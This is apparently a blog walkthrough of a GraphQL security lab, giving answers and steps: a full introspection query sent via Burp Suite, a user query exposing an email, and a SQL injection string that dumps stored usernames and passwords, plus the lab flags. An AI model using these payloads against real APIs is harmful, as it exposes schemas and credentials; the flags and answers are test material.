This article only has the answers and the way to get to those answers if you are struggling for some reason.

::This is also my first medium article so bear with the flaws that you find.::

Lets get started:

1: Introduction:
:No answer needed:

2: Introduction:
:No answer needed:

3: End points:
:No answer needed:

4: Common Vulnerabilities:
:No answer needed:

5: Introspection:
First of all you will have to understand what is GraphQL introspection:

feature that allows clients to query the schema itself. This means you can retrieve detailed information about all the types, fields, and relationships defined in the API. Introspection is an incredibly useful tool for developers because it enables them to explore an API’s capabilities without needing external documentation.

Question 1:
There are two queries after the introspection, namely User, and XXXX. What is the missing query?
Step 1: Capture the Login request with burp-suite or you can check for the “http history” in burpsuit.

![image](https://github.com/user-attachments/assets/3510a6de-dc85-4ec9-b7ec-b0751744a844)


Step 2: Send to Repeater:

Step 3:change the querry to:

{“query”:”query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { …FullType } directives { name description args { …InputValue } locations } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { …InputValue } type { …TypeRef } isDeprecated deprecationReason } inputFields { …InputValue } interfaces { …TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { …TypeRef } } fragment InputValue on __InputValue { name description type { …TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }”}

Step 4: Send the request and the application response contains the entire web application schema

Step 5: http://graphql-kit.com/graphql-voyager/

:be sure to remove the https header:
follow the steps:

![image](https://github.com/user-attachments/assets/88d4aa11-fa7f-42e6-ace5-6c936f71ae7f)


esponse:

ANSWER:: POST

QUESTION 2:
Challenge! Since you’re able to disclose the column names, what is the email of the user named bob?
Its a challenge: an easy one:
The Request you had captured in the Question 1: with the query in it:

just change the query to:

{
“query”: “\n query ($username: String!) {\n users(username: $username) {\n id\n username\n password\n email\n }\n }\n “,
“variables”: {
“username”: “bob”
}
}

ANSWER:: bob@graphql.thm

6:Graph SQL Injection :
Go to http://graphql.thm/labs/lab2/

Capture the login request.

Username : test , Password: anything

Care for the POST request :

::

Change the user name in the query From “test” to “test’ “
this will give the error in the page signifying the sql injection:

We will change the username to : test’ OR ‘1’=’1

In response , we will get all the users ID, password and username in the database:

There we will get out flag as well

ANSWER: GRAPHQL{sQl_1Nj3cti0n}

7: Securing GraphQL:
:No answer needed:

8: Conclusion:
:No answer needed:

:::THANKS FOR READING::::


